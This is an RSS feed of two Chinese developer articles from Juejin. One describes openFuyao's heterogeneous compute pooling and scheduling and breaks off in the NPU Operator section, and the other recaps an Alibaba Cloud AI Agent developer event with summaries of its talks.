<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[openFuyao多样化算力使能]]></title>    <link>https://juejin.cn/post/7584307642983677993</link>    <guid>https://juejin.cn/post/7584307642983677993</guid>    <pubDate>2025-12-16T07:45:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584307642983677993" data-draft-id="7584059298696413225" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="openFuyao多样化算力使能"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-16T07:45:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="几何心凉"/> <meta itemprop="url" content="https://juejin.cn/user/968044022608488"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            openFuyao多样化算力使能
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/968044022608488/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    几何心凉
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:45:04.000Z" title="Tue Dec 16 2025 07:45:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>一、引言：算力多样化时代的挑战与机遇</strong></p>
<p><strong><strong>1.1 当前算力发展趋势</strong></strong></p>
<p>在数字经济快速发展的时代，算力已成为新型生产力的核心驱动力。当前算力发展呈现出显著的多样化特征：</p>
<p>**<strong>·</strong> ** ** ***<strong>异构硬件普遍化</strong> *****：CPU、GPU、NPU、FPGA等多种处理器架构并存，不同硬件在计算能力、功耗特性、应用场景上各具优势</p>
<p>**<strong>·</strong> ** ** ***<strong>应用需求多元化</strong> *****：从传统通用计算到AI推理，从数据处理到密码学加速，不同业务对算力的需求差异巨大</p>
<p>**<strong>·</strong> ** ** ***<strong>资源利用率挑战</strong> *****：单一硬件架构难以满足全部需求，导致资源利用率低下、成本效益不理想</p>
<p>**<strong>·</strong> ** ** ***<strong>运维复杂度上升</strong> *****：多种硬件的管理、调度、监控需要统一的解决方案，否则运维成本急剧增加</p>
<p><strong><strong>1.2 openFuyao的解决方案</strong></strong></p>
<p>openFuyao作为开放的云原生异构算力平台，通过统一的资源池化与智能调度体系，为用户提供：</p>
<p>**<strong>·</strong> ** ** ***<strong>全栈硬件支持</strong> *****：集成CPU、NPU、KAE等多种算力资源，实现硬件能力的充分发挥</p>
<p>**<strong>·</strong> ** ** ***<strong>智能资源调度</strong> *****：基于应用特性和硬件能力的智能匹配，最大化资源利用效率</p>
<p>**<strong>·</strong> ** ** ***<strong>开放生态体系</strong> *****：为硬件厂商、平台开发者、应用开发者提供差异化价值</p>
<p>**<strong>·</strong> ** ** ***<strong>云原生架构</strong> *****：基于Kubernetes生态，提供容器化、自动化的运维体验</p>
<hr/>
<p><strong><strong>二、openFuyao多样化算力资源池化与调度总体方案</strong></strong></p>
<p><strong><strong>2.1 技术架构概览</strong></strong></p>
<p><strong><strong>2.1.1 三层架构设计</strong></strong></p>
<p>openFuyao采用分层架构设计，从下到上分为三层：</p>
<p><em><strong><strong><strong>第一层：硬件资源层</strong></strong></strong></em></p>
<p>· 物理硬件：CPU、NPU、KAE等异构处理器</p>
<p>· 硬件特征发现：通过NFD（Node Feature Discovery）自动识别硬件能力</p>
<p>· 硬件驱动与运行时：确保硬件能力的正确暴露和使用</p>
<p><em><strong><strong><strong>第二层：资源池化与调度层</strong></strong></strong></em></p>
<p>· 资源池管理：将异构硬件资源按类型和能力分类管理</p>
<p>· 调度引擎：基于应用需求和硬件特性进行智能调度决策</p>
<p>· 资源隔离：通过容器技术和配额管理实现多租户隔离</p>
<p><em><strong><strong><strong>第三层：应用与服务层</strong></strong></strong></em></p>
<p>· 应用框架：支持TensorFlow、PyTorch等主流AI框架</p>
<p>· 服务运行时：为应用提供统一的硬件访问接口</p>
<p>· 开发工具链：简化应用开发和部署流程</p>
<p><strong><strong>2.1.2 核心技术特性</strong></strong></p>
<p>**<strong>·</strong> ** ** ***<strong>自动化发现与管理</strong> *****：通过NFD和Operator模式自动发现、配置、管理异构硬件</p>
<p>**<strong>·</strong> ** ** ***<strong>灵活的资源调度</strong> *****：支持多维度调度策略，满足不同场景需求</p>
<p>**<strong>·</strong> ** ** ***<strong>可观测性</strong> *****：完整的监控、日志、追踪体系，支持问题诊断和性能优化</p>
<p>**<strong>·</strong> ** ** ***<strong>高可用与容错</strong> *****：支持故障自动转移、资源动态调整等高可用机制</p>
<p><strong><strong>2.2 多样化算力资源池化能力</strong></strong></p>
<p><strong><strong>2.2.1 CPU通用算力池</strong></strong></p>
<p>CPU通用算力池提供传统的通用计算能力：</p>
<p>**<strong>·</strong> ** ** ***<strong>资源特征</strong> *****：多核心、高主频、通用指令集</p>
<p>**<strong>·</strong> ** ** ***<strong>适用场景</strong> *****：通用服务、数据处理、控制流密集型任务</p>
<p>**<strong>·</strong> ** ** ***<strong>管理方式</strong> *****：基于Kubernetes原生的CPU资源管理，支持requests/limits配置</p>
<p>**<strong>·</strong> ** ** ***<strong>优化策略</strong> *****：支持NUMA感知调度、CPU亲和性配置，提升缓存命中率</p>
<p><strong><strong>2.2.2 NPU AI加速算力池</strong></strong></p>
<p>NPU（Neural Processing Unit）是专为AI计算优化的硬件处理器。<strong><strong>以下资源特征为NPU硬件本身的能力，openFuyao负责对这些硬件进行统一管理和调度：</strong></strong></p>
<p>**<strong>·</strong> ** ** ***<strong>资源特征</strong> *****：高吞吐量、低延迟、能效比高，针对矩阵运算优化（NPU硬件能力）</p>
<p>**<strong>·</strong> ** ** ***<strong>适用场景</strong> *****：AI推理、AI模型加速</p>
<p>**<strong>·</strong> ** ** ***<strong>管理方式</strong> *****：openFuyao通过NPU Operator进行全生命周期管理，包括驱动加载、资源分配、性能监控</p>
<p>**<strong>·</strong> ** ** ***<strong>优化策略</strong> *****：openFuyao支持多卡协同、混合精度计算、动态功耗管理的调度</p>
<p><strong><strong>2.2.3 KAE硬件加速算力池</strong></strong></p>
<p>KAE（Kunpeng Acceleration Engine）是鲲鹏处理器内置的硬件加速引擎，本身提供密码学和数据处理加速能力。<strong><strong>openFuyao的价值在于将KAE硬件能力纳入统一的资源池进行管理和调度：</strong></strong></p>
<p>**<strong>·</strong> ** ** ***<strong>资源特征</strong> *****：专用加速引擎，支持HTTPS、数据库加密、数据压缩等（KAE硬件能力）</p>
<p>**<strong>·</strong> ** ** ***<strong>适用场景</strong> *****：Web服务加密、数据库加密、数据压缩、安全通信</p>
<p>**<strong>·</strong> ** ** ***<strong>管理方式</strong> *****：openFuyao通过KAE Operator进行硬件管理和应用集成</p>
<p>**<strong>·</strong> ** ** ***<strong>优化策略</strong> *****：openFuyao支持应用透明加速、灵活的部署控制</p>
<p><strong><strong>2.2.4 Ray分布式计算资源池</strong></strong></p>
<p>Ray提供分布式计算框架支持：</p>
<p>**<strong>·</strong> ** ** ***<strong>资源特征</strong> *****：分布式任务调度、动态资源分配、灵活的编程模型</p>
<p>**<strong>·</strong> ** ** ***<strong>适用场景</strong> *****：分布式计算、数据处理、超参数优化</p>
<p>**<strong>·</strong> ** ** ***<strong>管理方式</strong> *****：与openFuyao调度层集成，支持Ray任务的资源感知调度</p>
<p>**<strong>·</strong> ** ** ***<strong>优化策略</strong> *****：支持异构资源感知，自动选择最优硬件执行任务</p>
<p><strong><strong>2.3 智能调度策略体系</strong></strong></p>
<p><strong><strong>2.3.1 多层次调度架构</strong></strong></p>
<p>openFuyao的调度体系采用多层次设计：</p>
<p><em><strong><strong><strong>集群级调度</strong></strong></strong></em></p>
<p>· 负责跨集群的资源分配和负载均衡</p>
<p>· 支持多集群统一管理和跨集群调度</p>
<p>· 实现混合云和边缘场景的资源协调</p>
<p><em><strong><strong><strong>节点级调度</strong></strong></strong></em></p>
<p>· 基于节点硬件特性的Pod调度</p>
<p>· 支持节点选择器、亲和性规则、污点容限等机制</p>
<p>· 实现硬件感知的智能调度</p>
<p><em><strong><strong><strong>容器级调度</strong></strong></strong></em></p>
<p>· 支持GPU/NPU等加速设备的细粒度分配</p>
<p>· 实现设备共享和隔离</p>
<p>· 支持动态资源调整</p>
<p><strong><strong>2.3.2 场景化调度策略</strong></strong></p>
<p>针对不同应用场景，openFuyao提供定制化的调度策略：</p>
<p><em><strong><strong><strong>推理服务场景</strong></strong></strong></em></p>
<p>· 支持低延迟推理，优先选择高性能NPU</p>
<p>· 支持动态批处理，提升吞吐量</p>
<p>· 支持模型缓存和预热</p>
<p><em><strong><strong><strong>Web服务场景</strong></strong></strong></em></p>
<p>· 支持KAE加速，自动卸载HTTPS加密计算</p>
<p>· 支持多副本部署和负载均衡</p>
<p>· 支持自动扩缩容</p>
<p><em><strong><strong><strong>数据处理场景</strong></strong></strong></em></p>
<p>· 支持Ray分布式计算框架</p>
<p>· 支持数据本地性优化</p>
<p>· 支持CPU和加速器的混合使用</p>
<p><strong><strong>2.3.3 调度优化技术</strong></strong></p>
<p>**<strong>·</strong> ** ** ***<strong>硬件感知调度</strong> *****：基于NFD发现的硬件特性进行调度决策</p>
<p>**<strong>·</strong> ** ** ***<strong>性能预测</strong> *****：利用历史数据预测应用在不同硬件上的性能表现</p>
<p>**<strong>·</strong> ** ** ***<strong>动态调整</strong> *****：根据实时负载和资源利用率动态调整调度策略</p>
<p>**<strong>·</strong> ** ** ***<strong>公平性与优先级</strong> *****：支持多租户场景下的资源公平分配和优先级管理</p>
<p><strong><strong>2.4 面向硬件厂商的价值</strong></strong></p>
<p>**<strong>·</strong> ** ** ***<strong>能力充分发挥</strong> *****：通过专用Operator和调度策略，确保硬件能力得到充分利用</p>
<p>**<strong>·</strong> ** ** ***<strong>生态开放</strong> *****：提供标准化接口，支持新硬件的快速集成</p>
<p>**<strong>·</strong> ** ** ***<strong>用户获取</strong> *****：通过openFuyao平台，硬件厂商可以接触更多用户和应用场景</p>
<p>**<strong>·</strong> ** ** ***<strong>成本优化</strong> *****：帮助用户优化硬件采购和使用成本，提升ROI</p>
<hr/>
<p><strong><strong>三、NPU Operator：昇腾AI算力的一键使能</strong></strong></p>
<p><strong><strong>说明</strong></strong>：NPU（昇腾AI处理器）的计算能力、推理优化等是硬件本身具备的特性。本章介绍的NPU Operator是openFuyao提供的管理组件，其核心价值在于实现NPU硬件的自动化发现、资源调度和生命周期管理，帮助用户更便捷地使用NPU硬件能力。</p>
<p><strong><strong>3.1 功能概述</strong></strong></p>
<p><strong><strong>3.1.1 NPU全生命周期自动化管理</strong></strong></p>
<p>NPU Operator是openFuyao提供的管理组件，负责从硬件发现到应用运行的全生命周期自动化管理：</p>
<p>**<strong>·</strong> ** ** ***<strong>自动化发现</strong> *****：自动识别集群中的NPU硬件，获取设备信息和能力</p>
<p>**<strong>·</strong> ** ** ***<strong>驱动管理</strong> *****：自动加载和更新NPU驱动程序，确保兼容性</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[活动回顾丨阿里云AI原生应用开发实战营AI Agent 专场（上海站）回顾&PPT下载]]></title>    <link>https://juejin.cn/post/7584057497206554667</link>    <guid>https://juejin.cn/post/7584057497206554667</guid>    <pubDate>2025-12-16T08:23:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584057497206554667" data-draft-id="7584057497206390827" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="活动回顾丨阿里云AI原生应用开发实战营AI Agent 专场（上海站）回顾&amp;PPT下载"/> <meta itemprop="keywords" content="Serverless"/> <meta itemprop="datePublished" content="2025-12-16T08:23:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿里云云原生"/> <meta itemprop="url" content="https://juejin.cn/user/3808363977648493"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            活动回顾丨阿里云AI原生应用开发实战营AI Agent 专场（上海站）回顾&amp;PPT下载
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808363977648493/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿里云云原生
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T08:23:31.000Z" title="Tue Dec 16 2025 08:23:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4674140b50b64393a613e068b9d45e60~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766478211&amp;x-signature=5%2BdARYtoWqKbbC6A6P5Wu5aFwYY%3D" alt="image.png" loading="lazy"/></p>
<p>AI Agent 正从技术概念快步走向生产应用。但是，开发者和企业从“原型”到“产品”的每一步，都充满了基础设施的挑战。要跨越这道鸿沟，需要的不仅仅是更聪明的模型，而是能全面解决这些问题的基础设施平台。</p>
<p>12 月 10 日，<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUzNzYxNjAzMg%3D%3D%26mid%3D2247580646%26idx%3D1%26sn%3D840d2fcc0e99bd012b89efdf86ae8c59%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUzNzYxNjAzMg==&amp;mid=2247580646&amp;idx=1&amp;sn=840d2fcc0e99bd012b89efdf86ae8c59&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">阿里云函数计算 AgentRun 正式发布</a>。这是一款以全球领先的函数计算 FC 为技术底座的一站式 Agentic AI 基础设施平台。它将 Serverless 的极致弹性、零运维和按量付费的特性与 AI 原生应用场景深度融合，助力企业实现成本与效率的极致优化，平均 TCO 降低 60%。</p>
<p>12 月 12 日“阿里云 AI 原生应用开发实战营——AI Agent 专场”上海站成功举办，本次活动是函数计算 AgentRun 发布后的第一场线下见面会。本次活动受众以 AI 开发者、企业决策人、技术负责人为主，通过主题演讲，行业案例剖析与实操演练相结合的方式，聚焦 AI Agent 企业级落地痛点，帮助开发者在短时间内掌握从理论到落地的完整技术路径，掌握高效可行的解决方案。</p>
<p>关注「阿里云云原生」公众号，后台回复：1212</p>
<p>免费下载上海站讲师 PPT 合集</p>
<h2 data-id="heading-0">精彩回顾</h2>
<h3 data-id="heading-1">议题一：AI 原生应用开发最佳实践</h3>
<p>阿里云智能集团产品专家刘宇为大家讲解：聚焦云原生时代 AI 基础设施的深度变革，剖析传统 AI 应用面临的开发门槛高、运维复杂、生态割裂等核心挑战。通过 FunctionAI，展示新一代云原生 AI 基础设施如何重新定义 AI 应用体验。探讨如何通过云原生技术栈构建开箱即用的 AI 基础设施，快速进行高可用的 AI Agent 构建，让开发者更专注 AI 业务创新，实现开源共建生态，让每个人都能享受 AI 时代的技术红利。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82c4c661d1b24b2b9834235a71081aa2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766478211&amp;x-signature=snBa9CUix07PQ5%2BmUVRD8HAveII%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-2">议题二：函数计算 AgentRun：企业级一站式 AI Agent 基础设施平台</h3>
<p>阿里云函数计算 AgentRun 研发负责人赵庆杰为大家讲解：围绕 Agentic AI 落地实践，其依赖记忆、上下文、模型治理与安全工具调用等基础设施，而传统架构在支撑这类高动态、状态化智能体时，常困于资源僵化、状态复杂和运维成本高。Serverless 以按需弹性、自动扩缩、强隔离和零运维，为每个 Agent 会话提供轻量、安全的运行环境，天然契合 Agentic AI 的执行模式。深度融合二者，不仅破解基础设施瓶颈，更释放其在自动化、个性化与复杂工作流中的创新潜能——让企业以云原生方式“运行智能”，驱动业务跃迁。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c03b5b31dea4752b97ae0e268e1a594~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766478211&amp;x-signature=mWO%2BKokuxUJzjHlwLJcmt6tkv1w%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-3">议题三：Function AI：生成式 AI 的落地实践与案例分享</h3>
<p>阿里云云原生解决方案架构师修省为大家讲解：围绕「生成式 AI」的落地真实实践，深入剖析用户使用函数计算 Function AI 构建生成式 AI 的架构特点和独有优势，同时给一些客户真实案例来展现通过 AIGC 在企业中如何落地给客户带来真实业务价值。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d5da662fa27944b4aa7a575970ee324c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766478211&amp;x-signature=ETJFnUXkBtyQ4LueBIWkZgz7EpU%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-4">议题四：AI 时代的“智能流量中枢”，AI 网关搭建与落地实践</h3>
<p>阿里云智能解决方案架构师赵世振为大家讲解：聚焦 AI 应用爆发式增长下的治理难题，深入剖析多模型集成、安全合规、成本失控与高可用保障等核心挑战。通过阿里云 AI 网关，打造企业级“智能流量中枢”，实现统一接入、安全管控、弹性容灾与成本优化，助力 AI 应用高效、稳定、合规落地。</p>
